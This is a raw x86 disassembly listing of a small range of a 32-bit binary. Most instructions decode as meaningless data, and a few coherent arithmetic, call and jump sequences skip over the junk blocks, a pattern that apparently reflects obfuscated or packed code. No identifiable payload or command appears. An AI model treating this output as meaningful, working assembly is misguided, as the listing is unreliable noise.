  410812:	outs   dx,BYTE PTR ds:[esi]
  410813:	sbb    BYTE PTR [ecx+0x48881a7b],bl
  410819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41081a:	mov    DWORD PTR [edx+0x584cbdc5],0x7dbcf303
  410824:	enter  0xdb0a,0x28
  410828:	(bad)  
  41082a:	pop    esp
  41082b:	rcr    BYTE PTR [edi+0x5d93766b],0x9d
  410832:	mov    al,ds:0xcdb94a3f
  410837:	mov    ebx,gs
  410839:	fs pop ecx
  41083b:	xlat   BYTE PTR ds:[ebx]
  41083c:	mov    esp,0xcc716b63
  410841:	add    BYTE PTR [ecx-0x3b],dh
  410844:	shr    BYTE PTR [ebp-0x13],0x19
  410848:	rcl    ecx,0xf9
  41084b:	aad    0x1d
  41084d:	or     eax,0xee0e6665
  410852:	and    DWORD PTR [ecx],edi
  410854:	inc    edx
  410855:	loopne 0x410869
  410857:	idiv   BYTE PTR cs:[ebp+0x27]
  41085b:	inc    ebx
  41085c:	jmp    0x4108bb
  41085e:	push   ds
  41085f:	lods   al,BYTE PTR ds:[esi]
  410860:	ja     0x410818
  410862:	or     cl,BYTE PTR [ebx-0x32]
  410865:	or     bh,al
  410867:	inc    edx
  410868:	sub    BYTE PTR [ebx-0x27],ch
  41086b:	xor    BYTE PTR [eax],dh
  41086d:	mov    BYTE PTR [ebp+0x68cf4070],ch
  410873:	ret    
  410874:	xchg   esi,eax
  410875:	push   esp
  410876:	mov    ecx,0xeacb881f
  41087b:	mov    cl,0x17
  41087d:	mov    esi,0x56bd1b83
  410882:	add    al,0xed
  410884:	(bad)  
  410885:	(bad)  [eax+0x78912a53]
  41088b:	dec    eax
  41088c:	jge    0x41089a
  41088e:	mov    DWORD PTR [edx-0x73],edx
  410891:	mov    cl,0x3a
  410893:	int    0x33
  410895:	mov    bh,0x7d
  410897:	cmp    al,0xc4
  410899:	call   0xc2255cc2
  41089e:	loope  0x4108e0
  4108a0:	sub    ebp,0xe25492e6
  4108a6:	and    ebp,DWORD PTR [edi-0x375b83b0]
  4108ac:	jae    0x4108a3
  4108ae:	push   0x1a
  4108b0:	inc    edx
  4108b1:	sub    dl,ah
  4108b3:	scas   al,BYTE PTR es:[edi]
  4108b4:	shr    bh,0x4
  4108b7:	inc    ebx
  4108b8:	mov    ebx,0xc8af4d74
  4108bd:	shl    BYTE PTR es:[ebp+0x12056528],0x2d
  4108c5:	jnp    0x410930
  4108c7:	inc    ecx
  4108c8:	and    DWORD PTR [esi+0x3c529fa],ebx
  4108ce:	xchg   edi,eax
  4108cf:	dec    esp
  4108d0:	pop    ss
  4108d1:	dec    edi
  4108d2:	cmp    eax,0xdbd2c624
  4108d7:	sti    
  4108d8:	pop    esi
  4108d9:	xchg   esi,eax
  4108da:	or     eax,0x3e17410b
  4108df:	mov    ebp,0xadbb1b53
  4108e4:	or     ebp,DWORD PTR [ecx]
  4108e6:	cwde   
  4108e7:	or     eax,0xe116c0d
  4108ec:	sub    al,BYTE PTR [esi+0x299cda5d]
  4108f2:	xchg   edx,eax
  4108f3:	and    al,0x8a
  4108f5:	or     BYTE PTR [edx],dl
  4108f7:	lock mov esp,es
  4108fa:	add    BYTE PTR [ebp+0x1a],dh
  4108fd:	mov    ebx,0x925d2df6
  410902:	xchg   edx,eax
  410903:	enter  0x8d6d,0xe5
  410907:	mov    ebp,0x607c3b42
  41090c:	cli    
  41090d:	mov    dh,0x4d
  41090f:	ret    
  410910:	pop    ebx
  410911:	test   al,0x9a
  410913:	pusha  
  410914:	xchg   DWORD PTR [eax],esi
  410916:	daa    
  410917:	aam    0x93
  410919:	shr    ecx,1
  41091b:	repnz hlt 
  41091d:	call   0xc495409
  410922:	pop    esp
  410923:	retf   
  410924:	mov    bl,0x7b
  410926:	sub    edx,ecx
  410928:	pushf  
  410929:	aas    
  41092a:	mov    dl,0x3
  41092c:	jnp    0x4108f5
  41092e:	int3   
  41092f:	loope  0x41099b
  410931:	daa    
  410932:	push   esp
  410933:	std    
  410934:	and    eax,ebp
  410936:	test   BYTE PTR [ebx+0x8],al
  410939:	dec    edx
  41093a:	cmc    
  41093b:	aad    0xd1
  41093d:	push   eax
  41093e:	dec    esp
  41093f:	jnp    0x4109ba
  410941:	cli    
  410942:	mov    esi,0x8619cb96
  410947:	inc    esi
  410948:	and    DWORD PTR [edx+edi*2+0x6a],ebx
  41094c:	dec    esi
  41094d:	sub    dl,dh
  41094f:	out    0x81,eax
  410951:	pop    edx
  410952:	xlat   BYTE PTR ds:[ebx]
  410953:	cmp    ah,bh
  410955:	adc    al,0x9d
  410957:	mov    esi,0x8dd9a24e
  41095c:	jmp    0x3993:0xcfca1b80
  410963:	add    eax,DWORD PTR [bp+di]
  410966:	xchg   ebp,eax
  410967:	gs (bad) 
  410969:	es scas eax,DWORD PTR es:[edi]
  41096b:	add    al,0xf6
  41096d:	ret    0xc7c3
  410970:	test   al,0xc5
  410972:	inc    edx
  410973:	jle    0x410940
  410975:	sub    DWORD PTR [ecx+edx*4+0x1fd2db1a],esi
  41097c:	nop
  41097d:	jmp    0x6408cbf7
  410982:	(bad)
  410985:	(bad)  
  410986:	fcmovne st,st(2)
  410988:	int    0xee
  41098a:	leave  
  41098b:	mov    ebx,0xdbfd9710
  410990:	std    
  410991:	in     eax,0xa8
  410993:	rol    BYTE PTR [eax],1
  410995:	xchg   ecx,eax
  410996:	mov    DWORD PTR [eax-0x36e522c5],ebp
  41099c:	sub    al,ah
  41099e:	mov    ?,ebp
  4109a0:	jns    0x41097f
  4109a2:	stos   DWORD PTR es:[edi],eax
  4109a3:	ret    
  4109a4:	or     edx,DWORD PTR [ebx-0x6e]
  4109a7:	ins    DWORD PTR es:[edi],dx
  4109a8:	std    
  4109a9:	ret    0x9095
  4109ac:	xchg   edx,eax
  4109ad:	ficomp WORD PTR [ebx+0x129e6f0b]
  4109b3:	aas    
  4109b4:	pop    esi
  4109b5:	lods   eax,DWORD PTR ds:[si]
  4109b7:	out    dx,al
  4109b8:	mov    ds,ebx
  4109ba:	ret    
  4109bb:	or     eax,0x58c4
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x42202c
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x42202c
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0xbc95811c
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [ecx-0x42],dh
  410a7e:	cli    
  410a7f:	fucomip st,st(3)
  410a81:	out    0xa2,al
  410a83:	add    al,0x2e
  410a85:	pop    ebp
  410a86:	jp     0x410a42
  410a88:	and    esi,DWORD PTR [ebx+0x50]
  410a8b:	mov    al,0xc1
  410a8d:	cld    
  410a8e:	push   ecx
  410a8f:	cmp    ah,BYTE PTR [edi+0xcd4d7b6]
  410a95:	scas   eax,DWORD PTR es:[edi]
  410a96:	das    
  410a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a98:	test   al,0x8b
  410a9a:	fdivr  DWORD PTR [edx+0x3ee534ae]
  410aa0:	out    dx,eax
  410aa1:	dec    edi
  410aa2:	xchg   ebp,eax
  410aa3:	arpl   WORD PTR [eax],bx
  410aa5:	or     BYTE PTR [esi+0x62],ah
  410aa8:	sbb    DWORD PTR [edx+0x15],esp
  410aab:	ret    
  410aac:	enter  0x6262,0x28
  410ab0:	mov    ch,0x6a
  410ab2:	cmc    
  410ab3:	retf   
  410ab4:	mov    bl,0x28
  410ab6:	jbe    0x410aea
  410ab8:	stos   BYTE PTR es:[edi],al
  410ab9:	pop    eax
  410aba:	mov    cl,0x3f
  410abc:	pop    esp
  410abd:	push   esi
  410abe:	mov    cs,WORD PTR [eax]
  410ac0:	mov    al,ds:0x3bd3b316
  410ac5:	mov    ds:0x26cc0e08,eax
  410aca:	mov    esp,0x83062a14
  410acf:	mov    edx,0x57af7efe
  410ad4:	fdivr  DWORD PTR fs:[esi]
  410ad7:	or     eax,edi
  410ad9:	lahf   
  410ada:	repz cdq 
  410adc:	sub    bh,BYTE PTR [edx-0x5d93ec9b]
  410ae2:	arpl   WORD PTR [ecx-0x6d37db20],si
  410ae8:	xchg   DWORD PTR [ebp+0x3d],ebp
  410aeb:	xchg   BYTE PTR [esi+0x33e7b0d9],ch
  410af1:	jecxz  0x410a87
  410af3:	sbb    BYTE PTR [esi-0x25],cl
  410af6:	std    
  410af7:	ins    BYTE PTR es:[edi],dx
  410af8:	or     cl,ah
  410afa:	inc    esi
  410afb:	out    dx,al
  410afc:	add    al,0x8
  410afe:	jbe    0x410aa4
  410b00:	add    edx,DWORD PTR [ecx-0x77]
  410b03:	(bad)  
  410b04:	loope  0x410ab8
  410b06:	sub    DWORD PTR [ecx],ecx
  410b08:	mov    ds:0xebeb29ad,al
  410b0d:	daa    
  410b0e:	sub    dl,bh
  410b10:	mov    bh,0xfe
  410b12:	cmc    
  410b13:	or     DWORD PTR [ebp+0x72],esp
  410b16:	mov    dh,0x5c
  410b18:	cs sahf 
  410b1a:	mov    esp,0xff2949d1
  410b1f:	mov    bl,0xe8
  410b21:	xchg   ebx,eax
  410b22:	add    bl,ah
  410b24:	jl     0x410ba4
  410b26:	int3   
  410b27:	in     eax,dx
  410b28:	sub    eax,0x60cbdff
  410b2d:	lock imul esi,DWORD PTR [ecx],0xe
  410b31:	fnstcw WORD PTR ds:0x1a350766
  410b37:	cmp    ch,bh
  410b39:	mov    esi,0x34083a5e
  410b3e:	xchg   dl,dl
  410b40:	inc    bp
  410b42:	aaa    
  410b43:	and    esi,eax
  410b45:	idiv   BYTE PTR [edx+0x8]
  410b48:	and    BYTE PTR [ecx-0x35],bl
  410b4b:	pop    esp
  410b4c:	inc    esi
  410b4d:	pushf  
  410b4e:	push   ebp
  410b4f:	inc    eax
  410b50:	mov    edi,0x5b1d3d10
  410b55:	and    al,BYTE PTR [edi+0x73]
  410b58:	sub    esi,DWORD PTR [edi+0x66]
  410b5b:	sub    edi,ebx
  410b5d:	into   
  410b5e:	mov    cl,0x95
  410b60:	(bad)  
  410b61:	loopne 0x410bb0
  410b63:	popf   
  410b64:	xor    DWORD PTR [edi-0x30],esi
  410b67:	xchg   ecx,eax
  410b68:	xchg   edx,eax
  410b69:	ins    BYTE PTR es:[edi],dx
  410b6a:	ins    BYTE PTR es:[edi],dx
  410b6b:	pushf  
  410b6c:	or     eax,DWORD PTR [ecx+0x25]
  410b6f:	fwait
  410b70:	add    BYTE PTR [eax-0x1b],0xbf
  410b74:	mov    bh,0x41
  410b76:	cli    
  410b77:	mov    esp,0x36f3b972
  410b7c:	xchg   BYTE PTR [eax-0x30],dh
  410b7f:	call   0xb6af:0xda9c955b
  410b86:	(bad)  
  410b88:	loop   0x410b42
  410b8a:	(bad)  
  410b8d:	jmp    0x410bce
  410b8f:	int3   
  410b90:	adc    eax,edx
  410b92:	ret    0x1d24
  410b95:	push   ds
  410b96:	pop    ebx
  410b97:	xchg   edi,eax
  410b98:	cmp    esp,DWORD PTR [eax]
  410b9a:	cmp    eax,0xb69338dc
  410b9f:	add    eax,0x71ecc9f5
  410ba4:	gs inc edx
  410ba6:	mov    dh,BYTE PTR [ecx]
  410ba8:	test   DWORD PTR [ecx-0x56bd260e],esi
  410bae:	data16 mov ds:0xedc3a002,al
  410bb4:	jg     0x410be6
  410bb6:	cmc    
  410bb7:	push   esi
  410bb8:	xchg   edx,eax
  410bb9:	sub    ah,bh
  410bbb:	ficom  WORD PTR [eax+0x2a]
  410bbe:	mov    ebp,0x4c0a6edf
  410bc3:	in     al,dx
  410bc4:	pop    ebp
  410bc5:	mov    eax,ds:0xc5df3e9f
  410bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bcb:	jmp    0x8c63ea16
  410bd0:	aas    
  410bd1:	jl     0x410bf0
  410bd3:	repnz dec edi
  410bd5:	scas   eax,DWORD PTR es:[edi]
  410bd6:	jg     0x410bb0
  410bd8:	mov    bl,0xa8
  410bda:	or     ah,BYTE PTR [eax]
  410bdc:	sar    dl,cl
  410bde:	xor    edi,DWORD PTR ds:0xf6018470
  410be4:	and    DWORD PTR [ecx+0x4ab648b6],0xffffffcf
  410beb:	or     al,0x29
  410bed:	xor    bh,BYTE PTR [ebx+0x40]
  410bf0:	mov    dh,0xbe
  410bf2:	stos   DWORD PTR es:[edi],eax
  410bf3:	pushf  
  410bf4:	pop    eax
  410bf5:	jae    0x410bbc
  410bf7:	jae    0x410c06
  410bf9:	mov    ah,0x7b
  410bfb:	test   eax,0x67394852
  410c00:	sti    
  410c01:	adc    DWORD PTR [ecx-0x5b],eax
  410c04:	add    DWORD PTR [ebp-0x8],esp
  410c07:	out    dx,al
  410c08:	pop    ebx
  410c09:	(bad)  
  410c0a:	icebp  
  410c0b:	lods   al,BYTE PTR ds:[esi]
  410c0c:	aam    0x4e
  410c0e:	or     al,0x34
  410c10:	inc    edi
  410c11:	mov    ch,0x91
  410c13:	scas   al,BYTE PTR es:[edi]
  410c14:	out    0x8f,al
  410c16:	dec    DWORD PTR [edi]
  410c18:	fistp  DWORD PTR [edx-0x69d5f940]
  410c1e:	test   BYTE PTR [eax],ch
  410c20:	push   esp
  410c21:	xchg   ebp,eax
  410c22:	add    al,0x85
  410c24:	xchg   edx,eax
  410c25:	inc    ebx
  410c26:	sub    ch,dl
  410c28:	imul   ebp,DWORD PTR [ebx],0x32
  410c2b:	(bad)  
  410c2c:	out    0xe7,al
  410c2e:	sbb    BYTE PTR [esi-0x344d1fff],0xba
  410c35:	lahf   
  410c36:	bound  eax,QWORD PTR [ebx+0x522dc01e]
  410c3c:	pop    edi
  410c3d:	mov    ebp,0x8f4ce50c
  410c42:	dec    edx
  410c43:	das    
  410c44:	data16 arpl si,si
  410c47:	and    eax,0xd2f0e46b
  410c4c:	cmp    edx,DWORD PTR [edx+0x3c]
  410c4f:	add    al,0x90
  410c51:	fmul   QWORD PTR [ebx+0x63b72a7d]
  410c57:	push   esp
  410c58:	ret    0xb22a
  410c5b:	adc    eax,0x7de6e6dd
  410c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c61:	push   0xffffff82
  410c63:	pop    ds
  410c64:	xchg   esi,eax
  410c65:	shl    esp,cl
  410c67:	mov    bl,0x2b
  410c69:	xor    BYTE PTR fs:[eax+ebx*4-0x40aa309a],dl
  410c71:	outs   dx,BYTE PTR ds:[esi]
  410c72:	dec    ebx
  410c73:	jge    0x410c40
  410c75:	popf   
  410c76:	in     eax,dx
  410c77:	add    BYTE PTR [eax],dl
  410c79:	adc    al,0x9d
  410c7b:	sbb    WORD PTR [esi-0x5aaa5e2e],sp
  410c82:	and    DWORD PTR [edi-0x52],ecx
  410c85:	mov    eax,0xbff7fc74
  410c8a:	adc    DWORD PTR [edx+0x1],esi
  410c8d:	sub    BYTE PTR [eax+0x46],ah
  410c90:	es jg  0x410ce1
  410c93:	js     0x410c99
  410c95:	gs or  DWORD PTR gs:[esi+0x7b43eeab],ecx
  410c9d:	sub    esp,eax
  410c9f:	xchg   edx,eax
  410ca0:	lods   eax,DWORD PTR ds:[esi]
  410ca1:	cmp    bl,BYTE PTR [edx]
  410ca3:	lahf   
  410ca4:	aam    0x10
  410ca6:	push   esp
  410ca7:	mov    cl,0x19
  410ca9:	aaa    
  410caa:	or     BYTE PTR [ebx-0xb3606ca],ah
  410cb0:	mov    ah,0xc8
  410cb2:	int    0x32
  410cb4:	cli    
  410cb5:	mov    esp,0xa0903a52
  410cba:	push   cs
  410cbb:	rol    BYTE PTR [edx],cl
  410cbd:	popf   
  410cbe:	pop    ecx
  410cbf:	ror    BYTE PTR [esi],0x44
  410cc2:	fistp  QWORD PTR [ecx+0x6003ec9]
  410cc8:	xchg   edi,eax
  410cc9:	adc    ebp,ebx
  410ccb:	pop    ebx
  410ccc:	scas   al,BYTE PTR es:[edi]
  410ccd:	ret    0x99c2
  410cd0:	pop    ss
  410cd1:	(bad)  
  410cd2:	push   esp
  410cd3:	push   cs
  410cd4:	ja     0x410cd2
  410cd6:	add    DWORD PTR [edx+0x3a772166],edi
  410cdc:	jbe    0x410c84
  410cde:	mov    eax,ds:0xe9bd3d82
  410ce3:	fild   WORD PTR [esi+edi*8+0x737dfe61]
  410cea:	(bad)  
  410ceb:	mov    al,0xc8
  410ced:	out    dx,al
  410cee:	ret    0xab5d
  410cf1:	mov    fs,WORD PTR [ebx-0x2f]
  410cf4:	hlt    
  410cf5:	call   0xb91b:0x90b0c7e1
  410cfc:	lds    eax,FWORD PTR [edx+0x1d]
  410cff:	push   esp
  410d00:	pop    ds
  410d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d02:	adc    eax,0x55e72eeb
  410d07:	push   edx
  410d08:	test   al,0xbf
  410d0a:	fwait
  410d0b:	mov    dh,0xc0
  410d0d:	call   0x80af6e3e
  410d12:	jmp    0xcf6fe3c3
  410d17:	and    esi,0xffffffd9
  410d1a:	fisub  DWORD PTR [ebx+0x4a]
  410d1d:	into   
  410d1e:	pop    ecx
  410d1f:	in     al,0x19
  410d21:	mov    BYTE PTR [ecx+edx*4+0x6fd89b72],dh
  410d28:	cld    
  410d29:	jg     0x410cfd
  410d2b:	inc    esp
  410d2c:	scas   eax,DWORD PTR es:[edi]
  410d2d:	xor    al,0xc0
  410d2f:	cmp    eax,0x14b5584
  410d34:	jmp    0x8b25ce84
  410d39:	int3   
  410d3a:	add    ebx,DWORD PTR [eax+0x75]
  410d3d:	cmp    bl,ah
  410d3f:	mov    DWORD PTR [ebp-0x4],edi
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffff89
  410d65:	imul   BYTE PTR [ebp-0x50]
  410d68:	ins    DWORD PTR es:[edi],dx
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0x5d62:0x1181814
  410d73:	das    
  410d74:	aas    
  410d75:	in     al,0x44
  410d77:	mov    ebp,0x4b24d0c7
  410d7c:	inc    DWORD PTR [esi+0x910c5d6]
  410d82:	mov    dl,0x59
  410d84:	mov    es,WORD PTR [edx]
  410d86:	repnz in al,dx
  410d88:	cmp    BYTE PTR [edi],cl
  410d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d8b:	fwait
  410d8c:	je     0x410d82
  410d8e:	adc    al,0x36
  410d90:	imul   edi,DWORD PTR [ecx+0x7],0x1a742dcf
  410d97:	ss sub eax,0x427cc515
  410d9d:	aam    0x1d
  410d9f:	inc    ecx
  410da0:	sub    DWORD PTR [edi-0x71],0x7d
  410da4:	shl    DWORD PTR [ebx+0x4c5b3031],0x49
  410dab:	mov    esi,0x5276ece5
  410db0:	push   esi
  410db1:	adc    DWORD PTR fs:[ebp-0x17],ecx
  410db5:	cmp    edi,DWORD PTR [esi-0x40]
  410db8:	inc    eax
  410db9:	mov    eax,0x77fabdb
  410dbe:	in     eax,0x27
  410dc0:	cmp    eax,0x39589524
  410dc5:	xchg   edx,eax
  410dc6:	fst    DWORD PTR [ecx]
  410dc8:	inc    ebx
  410dc9:	adc    DWORD PTR [ecx-0x2b],eax
  410dcc:	jle    0x410d5e
  410dce:	ds push ebp
  410dd0:	push   ss
  410dd1:	pop    es
  410dd2:	and    eax,0xbc3a448f
  410dd7:	dec    edx
  410dd8:	cmp    DWORD PTR [edi+ebp*8-0x6fef5edd],ecx
  410ddf:	scas   eax,DWORD PTR es:[edi]
  410de0:	push   esp
  410de1:	mov    cl,0x8
  410de3:	dec    edi
  410de4:	or     esi,esp
  410de6:	retf   
  410de7:	iret   
  410de8:	mov    eax,ds:0xd00b6d08
  410ded:	jnp    0x410e51
  410def:	sar    BYTE PTR [ebx],0x11
  410df2:	add    ah,bh
  410df4:	fisub  WORD PTR [ebp-0x7c]
  410df7:	jb     0x410de8
  410df9:	ret    
  410dfa:	mov    dh,0x7e
  410dfc:	in     eax,0x0
  410dfe:	dec    esp
  410dff:	out    dx,al
  410e00:	xor    eax,0x33e4c951
  410e05:	mov    ch,0x4c
  410e07:	mov    ?,WORD PTR [edx+0x3c5739f6]
  410e0d:	clc    
  410e0e:	xchg   DWORD PTR cs:[esi+ebx*1+0x7f],esi
  410e13:	pop    ss
  410e14:	mov    ecx,0x510dde37
  410e19:	jmp    0xbf42:0xdab0d909
  410e20:	add    al,0x9d
  410e22:	mov    edi,0xf76e561b
  410e27:	pop    esi
  410e28:	pop    ebp
  410e29:	stos   BYTE PTR es:[edi],al
  410e2a:	dec    ecx
  410e2b:	dec    edx
  410e2c:	cmp    al,0x87
  410e2e:	fnstcw WORD PTR [edx]
  410e30:	mov    bl,0x6d
  410e32:	cli    
  410e33:	add    eax,0xd64d0b49
  410e38:	test   DWORD PTR [edi+0x679334e9],ebp
  410e3e:	cmp    ah,BYTE PTR [edx+0x3da71407]
  410e44:	sahf   
  410e45:	mov    DWORD PTR [eax+0x61],esp
  410e48:	jbe    0x410e56
  410e4a:	sub    al,0x37
  410e4c:	cmp    BYTE PTR [edx],0xe2
  410e4f:	fdivr  DWORD PTR [edx+0x1f]
  410e52:	adc    eax,0xfb0eae3d
  410e57:	fwait
  410e58:	sbb    dh,ch
  410e5a:	data16 into 
  410e5c:	xlat   BYTE PTR ds:[ebx]
  410e5d:	cmp    al,0xec
  410e5f:	ja     0x410e86
  410e61:	cmp    eax,0xe3b008fe
  410e66:	retf   0xf133
  410e69:	dec    esi
  410e6a:	push   es
  410e6b:	mov    ebx,0x6754d27b
  410e70:	scas   eax,DWORD PTR es:[edi]
  410e71:	xor    BYTE PTR [edi-0x36],0x99
  410e75:	loopne 0x410e83
  410e77:	fwait
  410e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e79:	mov    esi,0x3ee58382
  410e7e:	inc    edi
  410e7f:	adc    eax,0x17740cc3
  410e84:	adc    al,0xfe
  410e86:	pushf  
  410e87:	jns    0x410e1d
  410e89:	fwait
  410e8a:	jmp    0x410e55
  410e8c:	sub    bh,ch
  410e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e8f:	or     BYTE PTR [ebp+0x52ebdc06],cl
  410e95:	mov    al,ds:0x870ce944
  410e9a:	and    al,0x74
  410e9c:	popf   
  410e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e9e:	jmp    0x410ec3
  410ea0:	fiadd  WORD PTR [eax+ebx*8]
  410ea3:	sub    eax,0x450aa194
  410ea8:	cdq    
  410ea9:	sbb    eax,0xaf75f092
  410eae:	(bad)  
  410eaf:	jae    0x410e95
  410eb1:	(bad)  
  410eb2:	jmp    0x410f2a
  410eb4:	adc    edi,DWORD PTR [ecx+0x23c03376]
  410eba:	sub    bh,bl
  410ebc:	fmul   QWORD PTR [edx+0x59602091]
  410ec2:	pop    edi
  410ec3:	sbb    dh,ah
  410ec5:	inc    eax
  410ec6:	and    DWORD PTR [eax-0x449f89bb],ecx
  410ecc:	ror    DWORD PTR [esi],0xe7
  410ecf:	cwde   
  410ed0:	push   edi
  410ed1:	jg     0x410f4e
  410ed3:	jl     0x410f06
  410ed5:	sub    ebp,DWORD PTR [edi+0xbd5d46c]
  410edb:	add    al,0x31
  410edd:	dec    ecx
  410ede:	es sub al,0x1
  410ee1:	xchg   esi,eax
  410ee2:	xor    BYTE PTR [ecx-0x70156177],al
  410ee8:	mov    bh,0xb3
  410eea:	add    BYTE PTR [eax-0x53],0x8e
  410eee:	mov    bl,BYTE PTR [ecx+eax*8]
  410ef1:	inc    ebp
  410ef2:	data16 fst st(1)
  410ef5:	pop    esp
  410ef6:	push   cs
  410ef7:	dec    eax
  410ef8:	bound  edx,QWORD PTR [ebx]
  410efa:	cmp    eax,0x3ab4a3da
  410eff:	pop    ecx
  410f00:	nop
  410f01:	rcr    DWORD PTR es:0x99224678,1
  410f08:	inc    ebx
  410f09:	fistp  WORD PTR [ebx+ecx*2+0x66]
  410f0d:	or     al,0x1d
  410f0f:	adc    BYTE PTR [edi],cl
  410f11:	clc    
  410f12:	push   ebp
  410f13:	add    dh,BYTE PTR [eax]
  410f15:	(bad)  
  410f17:	ret    0xe761
  410f1a:	jge    0x410f0f
  410f1c:	cmp    BYTE PTR [ecx-0x272837ae],al
  410f22:	shl    BYTE PTR [edx],0x97
  410f25:	xchg   ecx,eax
  410f26:	inc    edx
  410f27:	je     0x410f4b
  410f29:	inc    esi
  410f2a:	add    al,0xb0
  410f2c:	mov    ch,ch
  410f2e:	mov    eax,0xf189b07e
  410f33:	pop    ss
  410f34:	loope  0x410f71
  410f36:	jecxz  0x410ec8
  410f38:	mov    edi,0xa17484c7
  410f3d:	xchg   esp,eax
  410f3e:	and    eax,eax
  410f40:	out    dx,eax
  410f41:	or     al,0x2e
  410f43:	popf   
  410f44:	sbb    DWORD PTR [edx-0x75],ecx
  410f47:	repz pushf 
  410f49:	jg     0x410f62
  410f4b:	jp     0x410f9e
  410f4d:	dec    edi
  410f4e:	das    
  410f4f:	rcr    ch,cl
  410f51:	xlat   BYTE PTR ds:[ebx]
  410f52:	xchg   ebx,eax
  410f53:	or     eax,0x442dfa8d
  410f58:	ins    DWORD PTR es:[edi],dx
  410f59:	mov    eax,ds:0xf583facc
  410f5e:	rcr    DWORD PTR [edx],1
  410f60:	push   ecx
  410f61:	jl     0x410f3d
  410f63:	push   esp
  410f64:	ins    DWORD PTR es:[edi],dx
  410f65:	mov    esi,0x8ad3e308
  410f6a:	ins    DWORD PTR es:[edi],dx
  410f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f6c:	adc    ah,bh
  410f6e:	lahf   
  410f6f:	inc    ebp
  410f70:	retf   
  410f71:	test   DWORD PTR [bx-0x7e],0x933ff514
  410f79:	and    eax,0x681aec0f
  410f7e:	gs pop edi
  410f80:	add    eax,0x12dd3e63
  410f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f86:	mov    edi,0x8b40c5e5
  410f8b:	sub    DWORD PTR [edi+ebp*8],eax
  410f8e:	pusha  
  410f8f:	aas    
  410f90:	cmp    eax,0x29344b55
  410f95:	xor    al,0x5b
  410f97:	not    BYTE PTR [edi]
  410f99:	jb     0x410f9c
  410f9b:	xor    DWORD PTR [edx],0x2f
  410f9e:	push   edi
  410f9f:	fimul  DWORD PTR [edi-0x2a]
  410fa2:	xchg   edx,eax
  410fa3:	arpl   si,dx
  410fa5:	push   ecx
  410fa6:	loopne 0x410f7e
  410fa8:	lea    eax,[ecx]
  410faa:	and    eax,0x1318d568
  410faf:	dec    edi
  410fb0:	cmp    ecx,esp
  410fb2:	pop    ss
  410fb3:	add    eax,0x7105293a
  410fb8:	ds dec esi
  410fba:	inc    ebx
  410fbb:	inc    edi
  410fbc:	mov    edx,0x9cdb9dc4
  410fc1:	xor    DWORD PTR [ebp-0x71],ebp
  410fc4:	adc    ch,ah
  410fc6:	out    0xfc,eax
  410fc8:	dec    esp
  410fc9:	test   BYTE PTR [eax-0x70727977],ch
  410fcf:	pusha  
  410fd0:	and    ch,BYTE PTR [ebx]
  410fd2:	adc    edi,DWORD PTR [ebx+0x6846189c]
  410fd8:	dec    esp
  410fd9:	sub    ebx,DWORD PTR [ecx]
  410fdb:	or     DWORD PTR [ebp-0x77],edi
  410fde:	jle    0x41105a
  410fe0:	lock xor esp,edi
  410fe3:	xor    eax,0x8cbd997a
  410fe8:	mov    edi,0xf8e9871b
  410fed:	jg     0x41105c
  410fef:	call   0xda17:0x54e0bf95
  410ff6:	xchg   edx,eax
  410ff7:	mov    esp,0x5199e8b0
  410ffc:	add    edi,edi
  410ffe:	push   ss
  410fff:	dec    eax
  411000:	movaps xmm6,xmm4
  411003:	jbe    0x411050
  411005:	sub    DWORD PTR [edx+0x2b],0x4870de5c
  41100c:	adc    DWORD PTR [ebp+0x404d7962],esp
  411012:	push   0x3d70b009
  411017:	lahf   
